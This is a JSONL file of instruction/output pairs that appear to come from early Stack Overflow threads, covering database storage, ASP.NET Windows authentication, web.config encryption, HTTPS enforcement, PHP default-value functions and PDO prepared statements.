{"instruction": "So, the answer should probably be presented in tiers for the size of the application, but I'm wondering about people's experience with choosing where the disk drives used by the database should reside.\nHere are some of the options:\n\nJBOD - (just a bunch of disks) Old fashioned internal disks - fast but not very expandable\nNAS - Slow but cheap and expandable, probably best for backups\nDAS - A decent compromise, but generally accessible from only one or two machines\nSAN - Expensive but very good\n\nHow much should you worry about choosing a 15k drive over a 10k or 7200RPM?\nWhat's your favorite RAID level?", "output": "Although SAS-based DAS is likely to be quickest for a single DB server (ideally with 15krpm 2.5 inch SFF disks in a RAID 10 configuration) for most systems you lose a lot of the advantages that a SAN can bring. For that reason I'd always build databases with dual FC (4 or 8Gbps fibre links) adapters into dual SAN switches, connected to a dual-controller SAN array. Not only will this scenario be very quick indeed but it will open up the options to utilise the various snapshot techniques that these boxes have to offer. These can enable'live-live' DB replication between sites for DR, instant database restoration and excellent capacity expansion/reduction with no impact on the server/s themselves. Hope this helps, let me know if I can add any more."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Lambda Calculus\nInput and output are Church numerals (i.e. natural number k is \\f n. f^k n; so 3 = \\f n. f (f (f n)))\n(\\x. x x) (\\y f. f (y y f)) (\\y n. n (\\x y z. z) (\\x y. x) (\\f n. f n) (\\f. n (y (\\f m. n (\\g h. h (g f)) (\\x. m) (\\x. x)) f)))"}
{"instruction": "In the application I'm developping (in Java/swing), I have to show a full screen window on the second screen of the user.\nI did this using a code similar to the one you'll find below...\nBe, as soon as I click in a window opened by windows explorer, or as soon as I open windows explorer (i'm using windows XP), the full screen window is minimized...\nDo you know any way or workaround to fix this problem, or is there something important I did not understand with full screen windows?\nThanks for the help,\nimport javax.swing.JFrame;\nimport javax.swing.JPanel;\nimport javax.swing.JWindow;\n\nimport java.awt.BorderLayout;\nimport java.awt.Dimension;\nimport java.awt.GraphicsDevice;\nimport java.awt.GraphicsEnvironment;\nimport java.awt.Window;\n\nimport javax.swing.JButton;\nimport javax.swing.JToggleButton;\nimport java.awt.Rectangle;\nimport java.awt.GridBagLayout;\nimport javax.swing.JLabel;\n\npublic class FullScreenTest {\n\n    private JFrame jFrame = null;  //  @jve:decl-index=0:visual-constraint=\"94,35\"\n    private JPanel jContentPane = null;\n    private JToggleButton jToggleButton = null;\n    private JPanel jFSPanel = null;  //  @jve:decl-index=0:visual-constraint=\"392,37\"\n    private JLabel jLabel = null;\n    private Window window;\n    /**\n     * This method initializes jFrame\t\n     * \t\n     * @return javax.swing.JFrame\t\n     */\n    private JFrame getJFrame() {\n    \tif (jFrame == null) {\n    \t\tjFrame = new JFrame();\n    \t\tjFrame.setSize(new Dimension(474, 105));\n    \t\tjFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n    \t\tjFrame.setContentPane(getJContentPane());\n    \t}\n    \treturn jFrame;\n    }\n\n    /**\n     * This method initializes jContentPane\t\n     * \t\n     * @return javax.swing.JPanel\t\n     */\n    private JPanel getJContentPane() {\n    \tif (jContentPane == null) {\n    \t\tjContentPane = new JPanel();\n    \t\tjContentPane.setLayout(null);\n    \t\tjContentPane.add(getJToggleButton(), null);\n    \t}\n    \treturn jContentPane;\n    }\n\n    /**\n     * This method initializes jToggleButton\t\n     * \t\n     * @return javax.swing.JToggleButton\t\n     */\n    private JToggleButton getJToggleButton() {\n    \tif (jToggleButton == null) {\n    \t\tjToggleButton = new JToggleButton();\n    \t\tjToggleButton.setBounds(new Rectangle(50, 23, 360, 28));\n    \t\tjToggleButton.setText(\"Show Full Screen Window on 2nd screen\");\n    \t\tjToggleButton.addActionListener(new java.awt.event.ActionListener() {\n    \t\t\tpublic void actionPerformed(java.awt.event.ActionEvent e) {\n    \t\t\t\tshowFullScreenWindow(jToggleButton.isSelected());\n    \t\t\t}\n    \t\t});\n    \t}\n    \treturn jToggleButton;\n    }\n\n    protected void showFullScreenWindow(boolean b) {\n    \tif(window==null){\n    \t\twindow = initFullScreenWindow();\n    \t}\n    \twindow.setVisible(b);\n\n    }\n\n    private Window initFullScreenWindow() {\n    \tGraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();\n    \tGraphicsDevice[] gds = ge.getScreenDevices();\n    \tGraphicsDevice gd = gds[1];\n    \tJWindow window = new JWindow(gd.getDefaultConfiguration());\n    \twindow.setContentPane(getJFSPanel());\n    \tgd.setFullScreenWindow(window);\n    \treturn window;\n    }\n\n    /**\n     * This method initializes jFSPanel\t\n     * \t\n     * @return javax.swing.JPanel\t\n     */\n    private JPanel getJFSPanel() {\n    \tif (jFSPanel == null) {\n    \t\tjLabel = new JLabel();\n    \t\tjLabel.setBounds(new Rectangle(18, 19, 500, 66));\n    \t\tjLabel.setText(\"Hello ! Now, juste open windows explorer and see what happens...\");\n    \t\tjFSPanel = new JPanel();\n    \t\tjFSPanel.setLayout(null);\n    \t\tjFSPanel.setSize(new Dimension(500, 107));\n    \t\tjFSPanel.add(jLabel, null);\n    \t}\n    \treturn jFSPanel;\n    }\n\n    /**\n     * @param args\n     */\n    public static void main(String[] args) {\n    \tFullScreenTest me = new FullScreenTest();\n    \tme.getJFrame().setVisible(true);\n\n    }\n\n}", "output": "Usually when an application is in \"full screen\" mode it will take over the entire desktop.  For a user to get to another window they would have to alt-tab to it.  At that point windows would minimize the full screen app so that the other application could come to the front. \nThis sounds like it may be a bug (undocumented feature...) in windows.  It should probably not be doing this for a dual screen setup.  \nOne option to fix this is rather than setting it to be \"full screen\" just make the window the same size as the screen with location (0,0).  You can get screen information from the GraphicsConfigurations on the GraphicsDevice."}
{"instruction": "We have an ASP.NET application that manages it's own User, Roles and Permission database and we have recently added a field to the User table to hold the Windows domain account.  \nI would like to make it so that the user doesn't have to  physically log in to our application, but rather would be automatically logged in based on the currently logged in Windows domain account DOMAIN\\username.  We want to authenticate the Windows domain account against our own User table.  \nThis is a piece of cake to do in Windows Forms, is it possible to do this in Web Forms?\nI don't want the user to be prompted with a Windows challenge screen,  I want our system to handle the log in.\nClarification: We are using our own custom Principal object.\nClarification: Not sure if it makes a difference or not, but we are using IIS7.", "output": "using System.Security.Principal;\n...\nWindowsPrincipal wp = (WindowsPrincipal)HttpContext.Current.User;\n\nto get the current domain user. Of course you have to make sure that the IIS is set up to handle Windows Authentication."}
{"instruction": "We have an ASP.NET application that manages it's own User, Roles and Permission database and we have recently added a field to the User table to hold the Windows domain account.  \nI would like to make it so that the user doesn't have to  physically log in to our application, but rather would be automatically logged in based on the currently logged in Windows domain account DOMAIN\\username.  We want to authenticate the Windows domain account against our own User table.  \nThis is a piece of cake to do in Windows Forms, is it possible to do this in Web Forms?\nI don't want the user to be prompted with a Windows challenge screen,  I want our system to handle the log in.\nClarification: We are using our own custom Principal object.\nClarification: Not sure if it makes a difference or not, but we are using IIS7.", "output": "This might be helpful:    \nWindowsIdentity myIdentity = WindowsIdentity.GetCurrent();\n\nWindowsPrincipal myPrincipal = new WindowsPrincipal(myIdentity);\n\nstring name = myPrincipal.Identity.Name;\nstring authType = myPrincipal.Identity.AuthenticationType;\nstring isAuth = myPrincipal.Identity.IsAuthenticated.ToString();\n\nstring identName = myIdentity.Name;\nstring identType = myIdentity.AuthenticationType;\nstring identIsAuth = myIdentity.IsAuthenticated.ToString();\nstring iSAnon = myIdentity.IsAnonymous.ToString();\nstring isG = myIdentity.IsGuest.ToString();\nstring isSys = myIdentity.IsSystem.ToString();\nstring token = myIdentity.Token.ToString();\n\nDisclaimer: I got this from a technet article, but I can't find the link."}
{"instruction": "We have an ASP.NET application that manages it's own User, Roles and Permission database and we have recently added a field to the User table to hold the Windows domain account.  \nI would like to make it so that the user doesn't have to  physically log in to our application, but rather would be automatically logged in based on the currently logged in Windows domain account DOMAIN\\username.  We want to authenticate the Windows domain account against our own User table.  \nThis is a piece of cake to do in Windows Forms, is it possible to do this in Web Forms?\nI don't want the user to be prompted with a Windows challenge screen,  I want our system to handle the log in.\nClarification: We are using our own custom Principal object.\nClarification: Not sure if it makes a difference or not, but we are using IIS7.", "output": "I did pretty much exactly what you want to do a few years ago. Im trying to find some code for it, though it was at a previous job so that code is at home.\nI do remember though i used this article as my starting point. You set up the LDAP provider so you can actually run a check of the user vs the LDAP. One thing to make sure of if you try the LDAP approach. In the setting file where you set up the LDAP make sure LDAP is all caps, if it is not it will not resolve."}
{"instruction": "I've recently been working on a beginner's project in Scala, and have a beginner question about Scala's Lists.\nSay I have a list of tuples ( List[Tuple2[String, String]], for example). Is there a convenience method to return the first occurence of a specified tuple from the List, or is it necessary to iterate through the list by hand?", "output": "You could try using find. (Updated scala-doc location of find)"}
{"instruction": "We provide a web application with a frontend completely developed in Adobe Flash. When we chose Flash 6 years ago, we did so for its large number of features for user interaction, like dragging stuff, opening and closing menus, tree navigation elements, popup dialogs etc.\nToday it's obvious that AJAX/JS offers roughly the same possibilities and because of the number of frameworks that are readily available, it's very feasible to implement them.\nIs there a technical reason one should choose either technology over the other? By \"technical\", I mean performance, security, portability/compatibility and the like. I don't mean aspects such as the very non-programmer way development is done in Flash or whether it makes sense to switch an app from one to the other.\nAs I just explained in another question, it seems to me that JS is way ahead in terms of market share and I'm wondering whether we are missing some important point if we stick to Flash.", "output": "I suspect one of the reasons javascript is becoming more popular is that it's more easy to retrofit into an existing application."}
{"instruction": "We have an ASP.NET application that manages it's own User, Roles and Permission database and we have recently added a field to the User table to hold the Windows domain account.  \nI would like to make it so that the user doesn't have to  physically log in to our application, but rather would be automatically logged in based on the currently logged in Windows domain account DOMAIN\\username.  We want to authenticate the Windows domain account against our own User table.  \nThis is a piece of cake to do in Windows Forms, is it possible to do this in Web Forms?\nI don't want the user to be prompted with a Windows challenge screen,  I want our system to handle the log in.\nClarification: We are using our own custom Principal object.\nClarification: Not sure if it makes a difference or not, but we are using IIS7.", "output": "You can use System.Threading.Thread.CurrentPrincipal."}
{"instruction": "I am developing a web app which requires a username and password to be stored in the web.Config, it also refers to some URLs which will be requested by the web app itself and never the client.\nI know the .Net framework will not allow a web.config file to be served, however I still think its bad practice to leave this sort of information in plain text.  \nEverything I have read so far requires me to use a command line switch or to store values in the registry of the server.  I have access to neither of these as the host is online and I have only FTP and Control Panel (helm) access.\nCan anyone recommend any good, free encryption DLL's or methods which I can use?  I'd rather not develop my own!\nThanks for the feedback so far guys but I am not able to issue commands and and not able to edit the registry.  Its going to have to be an encryption util/helper but just wondering which one!", "output": "Encrypting and Decrypting Configuration Sections (ASP.NET) on MSDN\nEncrypting Web.Config Values in ASP.NET 2.0 on ScottGu's blog\nEncrypting Custom Configuration Sections on K. Scott Allen's blog\n\nEDIT:\nIf you can't use asp utility, you can encrypt config file using SectionInformation.ProtectSection method.\nSample on codeproject:\nEncryption of Connection Strings inside the Web.config in ASP.Net 2.0"}
{"instruction": "I am developing a web app which requires a username and password to be stored in the web.Config, it also refers to some URLs which will be requested by the web app itself and never the client.\nI know the .Net framework will not allow a web.config file to be served, however I still think its bad practice to leave this sort of information in plain text.  \nEverything I have read so far requires me to use a command line switch or to store values in the registry of the server.  I have access to neither of these as the host is online and I have only FTP and Control Panel (helm) access.\nCan anyone recommend any good, free encryption DLL's or methods which I can use?  I'd rather not develop my own!\nThanks for the feedback so far guys but I am not able to issue commands and and not able to edit the registry.  Its going to have to be an encryption util/helper but just wondering which one!", "output": "Use aspnet_setreg.exe http://support.microsoft.com/kb/329290"}
{"instruction": "Does anyone know how to setup Mercurial to use p4merge as the merge/diff tool on OS X 10.5?", "output": "I use the following bit of Python to launch p4merge and use it with git :\n#!/usr/bin/python\nimport sys\nimport os\n\nos.system('/Applications/p4merge.app/Contents/MacOS/p4merge \"%s\" \"%s\"' % (sys.argv[2], sys.argv[5]))\n\nI'm not sure how mercurial looks to launch an external diff tool though ? Hopefully it's as simple as adjusting 2 & 5 in the above line to being the index of the arguments for 'checked in' and 'current working copy'."}
{"instruction": "And/or: do I need one?\nI've recently started using FogBugz for my hobby projects, and I'm very happy with things so far. Having read more about it, especially the evidence-based scheduling, I'd like to start using it for my PhD as well. (Heh; something tells me my supervisors won't be opening tickets for me, though.)\nLast night I stumbled onto TimePost, which looks like a tidy app that doesn't do much but could be a real bonus to logging my time in FogBugz effectively. I tried looking around for similar apps but came up a little empty-handed. Are there any other FogBugz clients that you've used and recommend for Mac OS X? Or are you happy with the web interface?", "output": "I remember reading that there was a client in development, and I believe they're still looking for beta testers. See this URL\nhttp://support.fogcreek.com/default.asp?fogbugz.4.24403.0"}
{"instruction": "Alright, so I'm working on an application which will use a Linux back-end running PostgreSQL to serve up images to a Windows box with the front end written in C#.NET, though the front-end should hardly matter.  My question is:\n\nWhat is the best way to deal with storing images in Postgres?\n\nThe images are around 4-6 megapixels each, and we're storing upwards of 3000.  It might also be good to note: this is not a web application, there will at most be about two front-ends accessing the database at once.", "output": "In the database, there are two options:\n\nbytea.  Stores the data in a column, exported as part of a backup.  Uses standard database functions to save and retrieve.  Recommended for your needs.\nblobs.  Stores the data externally, not normally exported as part of a backup.  Requires special database functions to save and retrieve.\n\nI've used bytea columns with great success in the past storing 10+gb of images with thousands of rows.  PG's TOAST functionality pretty much negates any advantage that blobs have.  You'll need to include metadata columns in either case for filename, content-type, dimensions, etc."}
{"instruction": "Alright, so I'm working on an application which will use a Linux back-end running PostgreSQL to serve up images to a Windows box with the front end written in C#.NET, though the front-end should hardly matter.  My question is:\n\nWhat is the best way to deal with storing images in Postgres?\n\nThe images are around 4-6 megapixels each, and we're storing upwards of 3000.  It might also be good to note: this is not a web application, there will at most be about two front-ends accessing the database at once.", "output": "Try this.  I've use the Large Object Binary (LOB) format for storing generated PDF documents, some of which were 10+ MB in size, in a database and it worked wonderfully."}
{"instruction": "Alright, so I'm working on an application which will use a Linux back-end running PostgreSQL to serve up images to a Windows box with the front end written in C#.NET, though the front-end should hardly matter.  My question is:\n\nWhat is the best way to deal with storing images in Postgres?\n\nThe images are around 4-6 megapixels each, and we're storing upwards of 3000.  It might also be good to note: this is not a web application, there will at most be about two front-ends accessing the database at once.", "output": "Don't store in images in the database unless you absolutely have to.  I understand that this is not a web application, but if there isn't a shared file location that you can point to save the location of the file in the database.\n//linuxserver/images/imagexxx.jpg\n\nthen perhaps you can quickly set up a webserver and store the web urls in the database (as well as the local path).  While databases can handle LOB's and 3000 images (4-6 Megapixels, assuming 500K an image) 1.5 Gigs isn't a lot of space file systems are much better designed for storing large files than a database is."}
{"instruction": "So, the answer should probably be presented in tiers for the size of the application, but I'm wondering about people's experience with choosing where the disk drives used by the database should reside.\nHere are some of the options:\n\nJBOD - (just a bunch of disks) Old fashioned internal disks - fast but not very expandable\nNAS - Slow but cheap and expandable, probably best for backups\nDAS - A decent compromise, but generally accessible from only one or two machines\nSAN - Expensive but very good\n\nHow much should you worry about choosing a 15k drive over a 10k or 7200RPM?\nWhat's your favorite RAID level?", "output": "Eric, perhaps you could look at some form of SAN in the near future - even the cheapest systems offer some form of snapshot system. In the scenario you mentioned this would have allow you to have restored to a previous snapshot of your data in moments. The HP MSA2000fc box is quite cheap and offers some of these services, as do many other manufacturers of course."}
{"instruction": "I want to add the selected item from the TreeView to the ListBox control using DataBinding (If it can work with DataBinding). \n<TreeView HorizontalAlignment=\"Left\" \n          Margin=\"30,32,0,83\" \n          Name=\"treeView1\" \n          Width=\"133\" >\n\n</TreeView>\n<ListBox VerticalAlignment=\"Top\" \n         Margin=\"208,36,93,0\" \n         Name=\"listBox1\" \n         Height=\"196\" >       \n</ListBox>\n\nTreeView is populated from the code behind page with some dummy data.", "output": "I'm pretty sure it is possible, since WPF is really flexible with data binding, but I haven't done that specific scenario yet.\nI've been following a WPF Databinding FAQ from the MSDN blogs as of late and it provides a lot of insights that might help."}
{"instruction": "We have an application that works with MS Office and uses Microsoft.mshtml.dll. We use ClickOnce to deploy the application. The application deploys without issues on most machines, but sometimes we get errors saying \"System Update Required, Microsoft.mshtl.dll should be in the GAC\". \nWe tried installing the PIA for Office without luck. Since Microsoft.mshtml.dll is a system dependent file we cannot include it in the package and re-distribute it. What would be the best way to deploy the application?", "output": "You can set up prerequisites in a clickonce app, which would check for specific assemblies in the GAC before allowing users to install.  You would still need to manually install an app that includes the required office dll outside of ClickOnce, but you would at least avoid throwing errors."}
{"instruction": "And/or: do I need one?\nI've recently started using FogBugz for my hobby projects, and I'm very happy with things so far. Having read more about it, especially the evidence-based scheduling, I'd like to start using it for my PhD as well. (Heh; something tells me my supervisors won't be opening tickets for me, though.)\nLast night I stumbled onto TimePost, which looks like a tidy app that doesn't do much but could be a real bonus to logging my time in FogBugz effectively. I tried looking around for similar apps but came up a little empty-handed. Are there any other FogBugz clients that you've used and recommend for Mac OS X? Or are you happy with the web interface?", "output": "The official answer is no, there is not a dedicated Mac client, other than Safari :)\nThere's a command line version that runs on Linux, Windows, and Mac.\nThere are also plans for an iPhone version although I'm not technically supposed to announce features before they are done or even spec'd so pretend I didn't say that."}
{"instruction": "Is it possible to build Visual Studio solutions without having to fire up MonoDevelop?", "output": "I think you are looking for xbuild:\nhttp://www.mono-project.com/Microsoft.Build"}
{"instruction": "We have an application that works with MS Office and uses Microsoft.mshtml.dll. We use ClickOnce to deploy the application. The application deploys without issues on most machines, but sometimes we get errors saying \"System Update Required, Microsoft.mshtl.dll should be in the GAC\". \nWe tried installing the PIA for Office without luck. Since Microsoft.mshtml.dll is a system dependent file we cannot include it in the package and re-distribute it. What would be the best way to deploy the application?", "output": "Do you know which version of MS Office you are targeting? These PIAs are very specific to the version of Office. I remember when we were building a smart client application, we used to have Build VM machines, each one targeting a specific version of Outlook.\nAnother hurdle was not being able to specify these PIAs as pre-requisites or bundle them with the app. These PIAs needs to be installed on the client using Office CD (at least for 2003 version)."}
{"instruction": "I'm doing a little bit of work on a horrid piece of software built by Bangalores best.\nIt's written in mostly classic ASP/VbScript, but \"ported\" to ASP.NET, though most of the code is classic ASP style in the ASPX pages :(\nI'm getting this message when it tries to connect to my local database:\nMultiple-step OLE DB operation generated errors. Check each OLE DB status value, if available. No work was done.\nLine 38:    MasterConn = New ADODB.Connection()\nLine 39:    MasterConn.connectiontimeout = 10000\nLine 40:        MasterConn.Open(strDB)\n\nAnybody have a clue what this error means? Its connecting to my local machine (running SQLEXPRESS) using this connection string:\nPROVIDER=MSDASQL;DRIVER={SQL Server};Server=JONATHAN-PC\\SQLEXPRESS\\;DATABASE=NetTraining;Integrated Security=true\n\nWhich is the connection string that it was initially using, I just repointed it at my database.\nUPDATE:\nThe issue was using \"Integrated Security\" with ADO. I changed to using a user account and it connected just fine.", "output": "As a side note, connectionstrings.com is a great site so you don't have to remember all that connection string syntax."}
{"instruction": "We have an application that works with MS Office and uses Microsoft.mshtml.dll. We use ClickOnce to deploy the application. The application deploys without issues on most machines, but sometimes we get errors saying \"System Update Required, Microsoft.mshtl.dll should be in the GAC\". \nWe tried installing the PIA for Office without luck. Since Microsoft.mshtml.dll is a system dependent file we cannot include it in the package and re-distribute it. What would be the best way to deploy the application?", "output": "We are targeting Office 2003 and Office 2007, but using the Office 11 (2003) dlls as Office 2007 is backward compatible.\nThe problem occurs only for Microsoft.mshtml.dll file. This file is setup as a prerequisite in the ClickOnce app.\nOn this particular install we tried installing both the Office 2003 and Office 2007 PIA's to no avail."}
{"instruction": "Supposing you have a form that collects and submits sensitive information and you want to ensure it is never accessed via insecure (non-HTTPS) means, how might you best go about enforcing that policy?", "output": "Take a look at this: http://www.dotnetmonster.com/Uwe/Forum.aspx/asp-net/75369/Enforcing-https\nEdit: This shows solutions from an IIS point of view, but you should be able to configure about any web server for this."}
{"instruction": "Supposing you have a form that collects and submits sensitive information and you want to ensure it is never accessed via insecure (non-HTTPS) means, how might you best go about enforcing that policy?", "output": "In IIS? Go to security settings and hit \"Require secure connection\". Alternately, you can check the server variables in page load and redirect to the secure page."}
{"instruction": "Supposing you have a form that collects and submits sensitive information and you want to ensure it is never accessed via insecure (non-HTTPS) means, how might you best go about enforcing that policy?", "output": "If you're running Apache, you can put a RewriteRule in your .htaccess, like so:\nRewriteCond %{HTTPS} \"off\"\nRewriteRule /mypage.html https://example.com/mypage.html"}
{"instruction": "Supposing you have a form that collects and submits sensitive information and you want to ensure it is never accessed via insecure (non-HTTPS) means, how might you best go about enforcing that policy?", "output": "I'd suggest looking at the request in the code that renders the form, and if it is not using SSL, issue a redirect to the https URL.\nYou could also use a rewite rule in Apache to redirect the user.\nOr, you could just not serve up the page via HTTP, and keep it only in the document root of your HTTPS site."}
{"instruction": "I'm writing some DB routines and I'm using prepared statements.  My environment is PDO with PHP5.\nI understand prepared statements primarily provide a performance benefit, as well as some auxiliary bonuses such as not having to manually SQL-escape input data.\nMy question is about the performance part.\nI have two implementations of a getPrice function below that takes a product id and returns its price.\ngetPrice_A reuses the same PDOStatement object across subsequent calls within the same script execution.  Is this necessary or recommended?  If so, is there any way to avoid duplicating this extra code across every single get*() in every single model?\ngetPrice_B creates a new PDOStatement object on every call.  Will the DBMS recognize this statement has already been prepared and still be able to skip some work?  In other words, does this implementation properly take advantage of the performance benefits of prepared statements?\nHaving written all this out and read it over, I imagine getPrice_B is fine and getPrice_A is providing a negligible benefit on top of that, which may or may not be worth the extra complication.\nI'd still like to hear for sure from someone more knowledgable though.\nAssume that $pdo is a valid, connected PDO object in the examples below.\n<?php\nclass Product {\n    static function &getPrice_A($id) {\n        static $stmt;\n        if (!$stmt) {\n            $stmt = $pdo->prepare('SELECT price FROM products WHERE id = ?');\n        }\n        $stmt->execute(array($id));\n        return $stmt->fetchColumn(0);\n    }\n\n    static function &getPrice_B($id) {\n        $stmt = $pdo->prepare('SELECT price FROM products WHERE id = ?');\n        $stmt->execute(array($id));\n        return $stmt->fetchColumn(0);\n    }\n}\n\n// example usage:\n$price = Product::getPrice(4982);\necho \"Product 4982 costs $price\\n\";", "output": "From what I understand, prepared statements will reuse the generated SQL plan if it is the same statement, so the database will see the same prepared statement and not have to do the work to figure out how to query the database. I would say the extra work of saving the prepared statement in Product::getPrice_A is not typically very helpful, more because it can obscure the code rather than an issue of performance.  When dealing with performance, I feel it's always best to focus on code clarity and then performance when you have real statistics that indicate a problem.\nI would say \"yes, the extra work is unnecessary\" (regardless of if it really boosts performance).  Also, I am not a very big DB expert, but the performance gain of prepared statements is something I heard from others, and it is at the database level, not the code level (so if the code is actually invoking a parameterized statement on the actual DB, then the DB can do these execution plan caching... though depending on the database, you may get the benefit even without the parameterized statement).\nAnyways, if you are really worried about (and seeing) database performance issues, you should look into a caching solution... of which I would highly recommend memcached.  With such a solution, you can cache your query results and not even hit the database for things you access frequently."}
{"instruction": "I'm pretty sure the answer to this question is no, but in case there's some PHP guru\nis it possible to write a function in a way where invalid arguments or non existent variables can be passed in and php will not error without the use of '@'\nMuch like empty and isset do. You can pass in a variable you just made up and it won't error.\nex:\n\nempty($someBogusVar); // no error\n\nmyHappyFunction($someBogusVar); // Php warning / notice", "output": "No, because this isn't really anything to do with the function; the error is coming from attempting to de-reference a non-existent array key. You can change the warning level of your PHP setup to surpress these errors, but you're better off just not doing this.\nHaving said that, you could do something like\nfunction safeLookup($array, $key)\n{\n  if (isset($array, $key))\n    return $array[$key];\n\n  return 0;\n}\n\nAnd use it in place of array key lookup\ndefaultValue(safeLookup($foo, \"bar\"), \"baz);\n\nNow I need to take a shower :)"}
{"instruction": "I'm pretty sure the answer to this question is no, but in case there's some PHP guru\nis it possible to write a function in a way where invalid arguments or non existent variables can be passed in and php will not error without the use of '@'\nMuch like empty and isset do. You can pass in a variable you just made up and it won't error.\nex:\n\nempty($someBogusVar); // no error\n\nmyHappyFunction($someBogusVar); // Php warning / notice", "output": "@Brian: I use a trinary operation to do the check for me:\n\nreturn $value ? $value : $default;\n\nthis returns either $value OR $default. Depending upon the value of $value. If it is 0, false, empty or anything similar the value in $default will be returned.\nI'm more going for the challenge to emulate functions like empty() and isset()"}
{"instruction": "I'm pretty sure the answer to this question is no, but in case there's some PHP guru\nis it possible to write a function in a way where invalid arguments or non existent variables can be passed in and php will not error without the use of '@'\nMuch like empty and isset do. You can pass in a variable you just made up and it won't error.\nex:\n\nempty($someBogusVar); // no error\n\nmyHappyFunction($someBogusVar); // Php warning / notice", "output": "And going further up the abstraction tree, what are you using this for?\nYou could either initialize those values in each class as appropriate or create a specific class containing all the default values and attributes, like:\nclass Configuration {\n\n    private var $configValues = array( 'cool' => 'Defaultcoolval' ,\n                                       'uncool' => 'Defuncoolval'  );\n\n    public setCool($val) {\n        $this->configValues['cool'] = $val;\n    }\n\n    public getCool() {\n        return $this->configValues['cool'];\n    }\n\n}\n\nThe idea being that, when using defaultValue function everywhere up and down in your code, it will become a maintenance nightmare whenever you have to change a value, looking for all the places where you've put a defaultValue call. And it'll also probably lead you to repeat yourself, violating DRY.\nWhereas this is a single place to store all those default values. You might be tempted to avoid creating those setters and getters, but they also help in maintenance, in case it becomse pertinent to do some modification of outputs or validation of inputs."}
{"instruction": "I'm pretty sure the answer to this question is no, but in case there's some PHP guru\nis it possible to write a function in a way where invalid arguments or non existent variables can be passed in and php will not error without the use of '@'\nMuch like empty and isset do. You can pass in a variable you just made up and it won't error.\nex:\n\nempty($someBogusVar); // no error\n\nmyHappyFunction($someBogusVar); // Php warning / notice", "output": "I'm sure there could be a great discussion on ternary operators vrs function calls. But the point of this question was to see if we can create a function that won't throw an error if a non existent value is passed in without using the '@'"}
{"instruction": "I'm pretty sure the answer to this question is no, but in case there's some PHP guru\nis it possible to write a function in a way where invalid arguments or non existent variables can be passed in and php will not error without the use of '@'\nMuch like empty and isset do. You can pass in a variable you just made up and it won't error.\nex:\n\nempty($someBogusVar); // no error\n\nmyHappyFunction($someBogusVar); // Php warning / notice", "output": "You can do this using func_get_args like so:\nerror_reporting(E_ALL);\nini_set('display_errors', 1);\n\nfunction defaultValue() {\n    $args = func_get_args();\n\n    foreach($args as $arg) {\n        if (!is_array($arg)) {\n            $arg = array($arg);\n        }\n        foreach($arg as $a) {\n            if(!empty($a)) {\n                return $a;\n            }\n        }\n    }\n\n    return false;\n}\n\n$var = 'bob';\n\necho defaultValue(compact('var'), 'alpha') . \"\\n\"; //returns 'bob'\necho defaultValue(compact('var2'), 'alpha') . \"\\n\"; //returns 'alpha'\necho defaultValue('alpha') . \"\\n\"; //return\necho defaultValue() . \"\\n\";\n\nThis func goes one step further and would give you the first non empty value of any number of args (you could always force it to only take up to two args but this look more useful to me like this).\nEDIT: original version didn't use compact to try and make an array of args and STILL gave an error. Error reporting bumped up a notch and this new version with compact is a little less tidy, but still does the same thing and allows you to provide a default value for non existent vars."}
{"instruction": "I'm pretty sure the answer to this question is no, but in case there's some PHP guru\nis it possible to write a function in a way where invalid arguments or non existent variables can be passed in and php will not error without the use of '@'\nMuch like empty and isset do. You can pass in a variable you just made up and it won't error.\nex:\n\nempty($someBogusVar); // no error\n\nmyHappyFunction($someBogusVar); // Php warning / notice", "output": "@Sean That was already answered by Brian\nreturn isset($input) ? $input : $default;"}
{"instruction": "I'm pretty sure the answer to this question is no, but in case there's some PHP guru\nis it possible to write a function in a way where invalid arguments or non existent variables can be passed in and php will not error without the use of '@'\nMuch like empty and isset do. You can pass in a variable you just made up and it won't error.\nex:\n\nempty($someBogusVar); // no error\n\nmyHappyFunction($someBogusVar); // Php warning / notice", "output": "Sean, you could do:\n$result = ($func_result = doLargeIntenseFunction()) ? $func_result : 'no result';\n\nEDIT:\n\nI'm sure there could be a great\n  discussion on ternary operators vrs\n  function calls. But the point of this\n  question was to see if we can create a\n  function that won't throw an error if\n  a non existent value is passed in\n  without using the '@'\n\nAnd I told you, check it with isset(). A ternary conditional's first part doesn't check null or not null, it checks true or false. If you try to check true or false on a null value in PHP, you get these warnings. isset() checks whether a variable or expression returns a null value or not, and it returns a boolean, which can be evaluated by the first part of your ternary without any errors."}
{"instruction": "This is a segment of code from an app I've inherited, a user got a Yellow screen of death:\n\nObject reference not set to an instance of an object\n\non the line: \nbool l_Success ... \n\nNow I'm 95% sure the faulty argument is ref l_Monitor which is very weird considering the object is instantiated a few lines before. Anyone have a clue why it would happen? Note that I have seen the same issue pop up in other places in the code.\nIDMS.Monitor l_Monitor = new IDMS.Monitor();\nl_Monitor.LogFile.Product_ID = \"SE_WEB_APP\";\n\nif (m_PermType_RadioButtonList.SelectedIndex == -1) {\n    l_Monitor.LogFile.Log(\n        Nortel.IS.IDMS.LogFile.MessageTypes.ERROR,\n        \"No permission type selected\"\n        );\n    return;\n}\nbool l_Success = SE.UI.Utilities.GetPermissionList(\n    ref l_Monitor,\n    ref m_CPermissions_ListBox,\n    (int)this.ViewState[\"m_Account_Share_ID\"],\n    (m_PermFolders_DropDownList.Enabled)\n        ? m_PermFolders_DropDownList.SelectedItem.Value\n        : \"-1\",\n    (SE.Types.PermissionType)m_PermType_RadioButtonList.SelectedIndex,\n    (SE.Types.PermissionResource)m_PermResource_RadioButtonList.SelectedIndex);", "output": "You sure that one of the properties trying to be accessed on the l_Monitor instance isn't null?"}
